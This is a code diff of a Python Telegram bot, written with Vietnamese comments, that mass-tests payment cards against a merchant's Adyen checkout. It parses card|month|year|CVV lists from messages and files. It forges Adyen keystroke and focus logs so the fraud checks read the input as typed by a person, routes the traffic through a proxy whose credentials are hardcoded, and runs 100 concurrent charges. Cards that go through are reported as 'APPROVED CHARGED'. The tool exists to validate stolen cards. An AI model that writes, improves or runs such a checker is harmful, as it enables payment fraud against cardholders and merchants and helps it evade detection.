@@ -49,16 +49,13 @@ ALLOWED_USERS_FILE = "allowed_users.json"
 
 # Cấu hình Proxy cứng từ yêu cầu
 PROXY_STR = "asg.360s5.com:3600:88634867-zone-custom:AetOKcLB"
-try:
-    p_host, p_port, p_user, p_pass = PROXY_STR.split(":")
-    PROXY_URL = f"http://{p_user}:{p_pass}@{p_host}:{p_port}"
-    PROXIES_CONFIG = {
-        "http": PROXY_URL,
-        "https": PROXY_URL
-    }
-except ValueError:
-    print("Lỗi cấu hình Proxy! Kiểm tra lại PROXY_STR.")
-    PROXIES_CONFIG = {}
+p_host, p_port, p_user, p_pass = PROXY_STR.split(":")
+PROXY_URL = f"http://{p_user}:{p_pass}@{p_host}:{p_port}"
+
+PROXIES_CONFIG = {
+    "http": PROXY_URL,
+    "https": PROXY_URL
+}
 
 # Các key cấu hình
 ADYEN_KEY = "10001|98BA34B1675D6C2540AC464A37D0F13CBF019896E8B889F387C1481F69B1E6041A6A2D2EC48F6496619641447BE2F2A4ACBCC4AA8F51FDF0F9DD2ABE6D5C41FB8AD54DF47980A6F90C273D549BBF6A2DADF8A9B12D269C1C73BB5E48C931AB8F4C3E1A5666F85D73FDE2A99DA0BD3C152B5AA4D538EA9A922FA8FCA01B6C176CDB2922FFAA3052651BA456E4FF7D8B010549BCDC4357EDD1FFE3D1111281BD4C1BDE53562960B3BB81CF5C4F2EC3EEA6888FC9598524E5C327336AE5DEACE77983FF804CFC0FC83A2B6FECBD1F024651598E8D556ED341A0F0C58C997A8837154C76226D76D6B4D2D3EA3C5FAE83AFF395F0BA5675EB3789C11C8718699E5E43"
@@ -226,6 +223,7 @@ def generate_fake_adyen_log(input_length):
         
     # 4. Change (ch) & Blur (bl)
     base_time += random.randint(50, 150)
+    # log_parts.append(f"ch@{base_time}") # Một số trường hợp không cần ch nếu fill auto, nhưng thêm cho an toàn
     
     base_time += random.randint(100, 300)
     log_parts.append(f"bl@{base_time}") # Blur ra ngoài
@@ -241,7 +239,9 @@ def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, do
     card_number_fmt = format_card_number(card)
     
     # --- TẠO LOG BEHAVIOR ĐỘNG ---
+    # Log cho thẻ (16 số)
     card_log = generate_fake_adyen_log(16)
+    # Log cho cvc (3 hoặc 4 số)
     cvc_log = generate_fake_adyen_log(len(str(cvc)))
     
     card_detail = {
@@ -252,7 +252,7 @@ def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, do
             "activate": "3", 
             "referrer": referrer, 
             "numberFieldFocusCount": "1", 
-            "numberFieldLog": card_log, 
+            "numberFieldLog": card_log, # Dữ liệu log động
             "numberFieldClickCount": "1", 
             "numberFieldKeyCount": str(len(card)),
             "numberFieldBlurCount": "1"
@@ -272,7 +272,7 @@ def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, do
             "activate": "4", 
             "referrer": referrer, 
             "cvcFieldFocusCount": "1", 
-            "cvcFieldLog": cvc_log, 
+            "cvcFieldLog": cvc_log, # Dữ liệu log động
             "cvcFieldClickCount": "1", 
             "cvcFieldKeyCount": str(len(str(cvc))), 
             "cvcFieldChangeCount": "1", 
@@ -288,59 +288,39 @@ def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, do
     return encrypted_details
 
 # ===================================================================
-# === PHẦN 2: HELPER FUNCTIONS (REGEX FIX & LOGIC)
+# === PHẦN 2: HELPER FUNCTIONS (CẬP NHẬT NAME & LOGIC)
 # ===================================================================
 
 def normalize_card(card_str):
-    # Cập nhật Regex chặt chẽ hơn: chỉ chấp nhận phân cách | / : ; - hoặc khoảng trắng
-    # Tránh bắt nhầm các đoạn text khác
-    pattern = r'(\d{13,19})[\s|/;:.-]+(\d{1,2})[\s|/;:.-]+(\d{2,4})[\s|/;:.-]+(\d{3,4})'
+    pattern = r'(\d{13,19})[|/:](\d{1,2})[|/:](\d{2,4})[|/:](\d{3,4})'
     match = re.search(pattern, card_str)
-    
     if not match:
         return None
-    
     card_num, month, year, cvv = match.groups()
-    
-    # Validate Month
     try:
         month_int = int(month)
         if month_int < 1 or month_int > 12: return None
     except ValueError: return None
-    
-    # Validate Year
+    month = month.zfill(2)
     if len(year) == 2: year = '20' + year
     try:
         year_int = int(year)
-        if year_int < 2024 or year_int > 2040: # Giới hạn năm hợp lý để tránh rác
-            return None
+        if year_int < 2000 or year_int > 2099: return None
     except ValueError: return None
-    
-    month = month.zfill(2)
     return f"{card_num}|{month}|{year}|{cvv}"
 
 def extract_cards_from_text(text):
     if not text: return []
+    raw_pattern = r'(\d{13,19})\D+(\d{1,2})\D+(\d{2,4})\D+(\d{3,4})'
+    matches = re.findall(raw_pattern, text)
     valid_cards = []
     seen = set()
-    
-    # Xử lý từng dòng để tránh Regex ăn lan từ dòng này sang dòng kia
-    lines = text.splitlines()
-    
-    # Regex chặt chẽ: Card + (Separators) + Month + ...
-    # [\s|/;:.-]+ nghĩa là 1 hoặc nhiều ký tự phân cách (space, |, /, :, ;, ., -)
-    pattern_strict = r'(\d{13,19})[\s|/;:.-]+(\d{1,2})[\s|/;:.-]+(\d{2,4})[\s|/;:.-]+(\d{3,4})'
-    
-    for line in lines:
-        matches = re.findall(pattern_strict, line)
-        for m in matches:
-            # Tạo chuỗi tạm để normalize kiểm tra lại logic ngày tháng
-            temp_str = f"{m[0]}|{m[1]}|{m[2]}|{m[3]}"
-            normalized = normalize_card(temp_str)
-            if normalized and normalized not in seen:
-                valid_cards.append(normalized)
-                seen.add(normalized)
-    
+    for m in matches:
+        temp_str = f"{m[0]}|{m[1]}|{m[2]}|{m[3]}"
+        normalized = normalize_card(temp_str)
+        if normalized and normalized not in seen:
+            valid_cards.append(normalized)
+            seen.add(normalized)
     return valid_cards
 
 def validate_luhn(card_number):
@@ -369,15 +349,20 @@ def get_short_brand_name(cc):
     else: return 'unknown'
 
 def generate_random_email():
+    """
+    Tạo email ngẫu nhiên với tên US và domain gmail/hotmail
+    """
     us_names = [
         "james", "john", "robert", "michael", "william", "david", "richard", "joseph", "thomas", "charles", 
         "christopher", "daniel", "matthew", "anthony", "donald", "mark", "paul", "steven", "andrew", "kenneth", 
         "joshua", "kevin", "brian", "george", "edward", "ronald", "timothy", "jason", "jeffrey", "ryan", 
-        "jacob", "gary", "nicholas", "eric", "jonathan", "stephen", "larry", "justin", "scott", "brandon"
+        "jacob", "gary", "nicholas", "eric", "jonathan", "stephen", "larry", "justin", "scott", "brandon", 
+        "benjamin", "samuel", "frank", "gregory", "raymond", "alexander", "patrick", "jack", "dennis", "jerry"
+        "trumpp"
     ]
     name = random.choice(us_names)
     random_str = ''.join(random.choices(string.digits, k=4))
-    domain = random.choice(["@gmail.com", "@hotmail.com", "@yahoo.com"])
+    domain = random.choice(["@gmail.com", "@hotmail.com"])
     return f"{name}{random_str}{domain}"
 
 def generate_dadus():
@@ -387,7 +372,6 @@ def generate_dadus():
 
 def generate_progress_bar(current, total, length=15):
     """Tạo thanh loading bar text"""
-    if total == 0: return ""
     percent = current / total
     filled_length = int(length * percent)
     bar = "█" * filled_length + "░" * (length - filled_length)
@@ -410,8 +394,13 @@ async def get_bin_info(session, cc_num):
         return "BIN ERROR"
 
 async def check_card_core(line, session_semaphore=None):
+    """
+    Core logic xử lý thẻ.
+    Lấy thông tin price_val và offer_id từ biến toàn cục CURRENT_OFFER_INDEX
+    """
     global CURRENT_OFFER_INDEX
     
+    # Lấy config hiện tại
     current_config = OFFER_MAP.get(CURRENT_OFFER_INDEX, OFFER_MAP[1])
     price_val = current_config["price"]
     offer_id = current_config["id"]
@@ -427,15 +416,12 @@ async def check_card_core(line, session_semaphore=None):
 
     if not line: return result
     normalized = normalize_card(line)
-    if not normalized: 
-        # Nếu normalize thất bại, trả về lỗi ngay
-        return result
-        
+    if not normalized: return result
     cc, mm, yyyy, cvc = normalized.split('|')
     
     if not validate_luhn(cc):
         result["msg"] = "Luhn Fail"
-        result["full_log"] = f"{normalized} - Luhn Fail"
+        result["full_log"] = f"{line} - Luhn Fail"
         return result
 
     if session_semaphore:
@@ -446,7 +432,7 @@ async def check_card_core(line, session_semaphore=None):
 
 async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, start_time):
     retry_count = 0
-    max_retries = 2
+    max_retries = 20
     impersonate_ver = "chrome120"
     
     while retry_count < max_retries:
@@ -481,7 +467,7 @@ async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, start_time):
                     retry_count += 1
                     continue
 
-                # --- BƯỚC 3: MÃ HÓA ---
+                # --- BƯỚC 3: MÃ HÓA (Đã tích hợp log behavior) ---
                 encrypted_data = encrypt_card_data_480(cc, mm, yyyy, cvc, ADYEN_KEY, STRIPE_KEY, DOMAIN_URL)
 
                 # --- BƯỚC 4: THANH TOÁN ---
@@ -567,7 +553,7 @@ async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, start_time):
     return {"status": "ERROR", "is_live": False, "full_log": f"{cc}|{mm}|{yyyy}|{cvc}|ERROR|Timeout or Network Error"}
 
 # ===================================================================
-# === PHẦN 4: LOGIC XỬ LÝ HÀNG LOẠT (NON-BLOCKING)
+# === PHẦN 4: LOGIC XỬ LÝ HÀNG LOẠT
 # ===================================================================
 
 class CheckStats:
@@ -581,14 +567,11 @@ class CheckStats:
         self.is_running = True
 
 async def process_card_list(update: Update, context: ContextTypes.DEFAULT_TYPE, card_list: list):
-    """
-    Hàm xử lý chạy ngầm, không block main thread
-    """
     global CURRENT_OFFER_INDEX
     
     total_cards = len(card_list)
     if total_cards == 0:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Không tìm thấy thẻ hợp lệ nào.")
+        await update.message.reply_text("❌ Không tìm thấy thẻ hợp lệ nào.")
         return
 
     # Lấy thông tin mode hiện tại để hiển thị
@@ -598,53 +581,43 @@ async def process_card_list(update: Update, context: ContextTypes.DEFAULT_TYPE, 
     stats = CheckStats()
     stats.total = total_cards
     
-    # Gửi tin nhắn khởi tạo
-    try:
-        status_msg = await context.bot.send_message(
-            chat_id=update.effective_chat.id,
-            text=f"🚀 **Started Background Task**\n"
-                 f"💰 Mode: {price_display}\n"
-                 f"Cards: {total_cards}\n"
-                 f"Threads: 100"
-        )
-    except:
-        return
+    status_msg = await update.message.reply_text(
+        f"🚀 **Starting 100 Threads...**\n"
+        f"💰 Mode: {price_display}\n"
+        f"Cards: {total_cards}"
+    )
 
     chat_id = update.effective_chat.id
     live_file = f"live_{chat_id}.txt"
     die_file = f"die_{chat_id}.txt"
     error_file = f"error_{chat_id}.txt"
     
-    # Xóa file cũ
     for f_path in [live_file, die_file, error_file]:
         if os.path.exists(f_path): os.remove(f_path)
 
     semaphore = asyncio.Semaphore(100)
     file_lock = asyncio.Lock()
     
-    # Task cập nhật UI
     async def update_ui_loop():
-        last_checked = -1
         while stats.is_running and stats.checked < stats.total:
-            await asyncio.sleep(3.0) 
-            if stats.checked != last_checked: # Chỉ edit nếu có thay đổi
-                last_checked = stats.checked
-                elapsed = time.time() - stats.start_time
-                cpm = int((stats.checked / elapsed) * 60) if elapsed > 0 else 0
-                progress_bar = generate_progress_bar(stats.checked, stats.total, length=15)
-                
-                text = (
-                    f"⚡ **Checking in Background...**\n"
-                    f"{progress_bar}\n"
-                    f"💰 Price: {price_display}\n"
-                    f"✅ Live: {stats.live} | ❌ Die: {stats.die} | ⚠️ Err: {stats.error}\n"
-                    f"Checked: {stats.checked}/{stats.total}\n"
-                    f"🚀 CPM: {cpm}\n"
-                    f"ℹ️ Bot vẫn nhận lệnh khác bình thường."
-                )
-                try:
-                    await status_msg.edit_text(text)
-                except: pass 
+            await asyncio.sleep(2.0) # Cập nhật UI chậm hơn chút để đỡ spam
+            elapsed = time.time() - stats.start_time
+            cpm = int((stats.checked / elapsed) * 60) if elapsed > 0 else 0
+            
+            # Tạo thanh progress bar
+            progress_bar = generate_progress_bar(stats.checked, stats.total, length=15)
+            
+            text = (
+                f"⚡ **Checking in Progress...**\n"
+                f"{progress_bar}\n"
+                f"💰 Price: {price_display}\n"
+                f"✅ Live: {stats.live} | ❌ Die: {stats.die} | ⚠️ Err: {stats.error}\n"
+                f"Checked: {stats.checked}/{stats.total}\n"
+                f"🚀 CPM: {cpm}"
+            )
+            try:
+                await status_msg.edit_text(text)
+            except: pass 
 
     ui_task = asyncio.create_task(update_ui_loop())
 
@@ -652,8 +625,9 @@ async def process_card_list(update: Update, context: ContextTypes.DEFAULT_TYPE, 
         res = await check_card_core(line, session_semaphore=semaphore)
         stats.checked += 1
         
-        # BÁO LIVE TỨC THÌ
+        # --- CẢI TIẾN: BÁO LIVE TỨC THÌ ---
         if res["is_live"]:
+            # Gửi tin nhắn ngay lập tức
             try:
                 msg_live = (
                     f"✅ **APPROVED CHARGED!**\n"
@@ -675,21 +649,19 @@ async def process_card_list(update: Update, context: ContextTypes.DEFAULT_TYPE, 
                 stats.die += 1
                 with open(die_file, "a", encoding="utf-8") as f: f.write(res["full_log"] + "\n")
     
-    # Chạy các worker
     tasks = [worker(line) for line in card_list]
     await asyncio.gather(*tasks)
 
     stats.is_running = False
     await ui_task 
 
-    # Gửi kết quả cuối cùng
-    await context.bot.send_message(chat_id=chat_id, text=f"✅ **Hoàn tất Check!**\nLive: {stats.live} | Die: {stats.die}")
+    await update.message.reply_text("✅ **Hoàn tất! Đang gửi kết quả...**")
     
     async def send_result_file(file_path, caption_title):
         if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
             try:
                 with open(file_path, 'rb') as f:
-                    await context.bot.send_document(chat_id=chat_id, document=f, caption=f"📂 {caption_title}")
+                    await update.message.reply_document(document=f, caption=f"📂 {caption_title}")
             except Exception: pass
             finally:
                 if os.path.exists(file_path): os.remove(file_path)
@@ -722,7 +694,7 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🤖 **Taonga Payment Bot - V2 Advanced**\n"
         f"👋 Xin chào, {role}\n\n"
         "1. `/st <cc>`: Check lẻ.\n"
-        "2. Gửi file `.txt` hoặc `/mass` để check (Chạy ẩn).\n"
+        "2. Gửi file `.txt` hoặc `/mass` để check.\n"
         "3. `/setam <1-6>`: Cài đặt mệnh giá charge (ADMIN).\n"
         "4. `/allow <id>`: Thêm thành viên (ADMIN).\n\n"
         f"🔥 Config hiện tại: Mode {CURRENT_OFFER_INDEX} ({OFFER_MAP[CURRENT_OFFER_INDEX]['price']}$)"
@@ -782,15 +754,15 @@ async def set_amount_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
 async def single_check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         full_text = update.message.text
-        # Logic check lẻ vẫn dùng await trực tiếp để trả về kết quả ngay
         cards = extract_cards_from_text(full_text)
         if not cards:
-            await update.message.reply_text("⚠️ Không tìm thấy thẻ hoặc sai định dạng.")
+            await update.message.reply_text("⚠️ Không tìm thấy thẻ.")
             return
 
+        # Lấy config hiện tại để báo
         current_config = OFFER_MAP.get(CURRENT_OFFER_INDEX)
-        card_data = cards[0]
         
+        card_data = cards[0]
         msg = await update.message.reply_text(f"⏳ Đang check: {card_data}\n💰 Mode: {current_config['price']}$")
         
         result = await check_card_core(card_data)
@@ -818,13 +790,9 @@ async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         full_text = update.message.text
         cards = extract_cards_from_text(full_text)
         if not cards:
-            await update.message.reply_text("⚠️ Không tìm thấy thẻ hợp lệ.")
+            await update.message.reply_text("⚠️ Không tìm thấy thẻ.")
             return
-        
-        # FIX: Dùng create_task để chạy ngầm, không block bot
-        await update.message.reply_text(f"🚀 Đã nhận {len(cards)} thẻ. Quá trình check sẽ chạy ngầm...")
-        asyncio.create_task(process_card_list(update, context, cards))
-        
+        await process_card_list(update, context, cards)
     except Exception as e:
         await update.message.reply_text(f"Lỗi Mass: {str(e)}")
 
@@ -837,12 +805,8 @@ async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     file = await context.bot.get_file(document.file_id)
     file_content = await file.download_as_bytearray()
     full_text = file_content.decode('utf-8')
-    
     cards = extract_cards_from_text(full_text)
-    
-    # FIX: Dùng create_task để chạy ngầm
-    await update.message.reply_text(f"🚀 Đã nhận file {len(cards)} thẻ. Quá trình check sẽ chạy ngầm...")
-    asyncio.create_task(process_card_list(update, context, cards))
+    await process_card_list(update, context, cards)
 
 # ===================================================================
 # === MAIN
@@ -855,8 +819,8 @@ if __name__ == '__main__':
     app.add_handler(CommandHandler("start", start_command))
     app.add_handler(CommandHandler("st", single_check_command))
     app.add_handler(CommandHandler("mass", mass_command))
-    app.add_handler(CommandHandler("setam", set_amount_command))
-    app.add_handler(CommandHandler("allow", allow_user_command))
+    app.add_handler(CommandHandler("setam", set_amount_command)) # Đã có check admin bên trong
+    app.add_handler(CommandHandler("allow", allow_user_command)) # Đã có check admin bên trong
     app.add_handler(MessageHandler(filters.Document.ALL, file_handler))
     
     print("Bot đang chạy...")
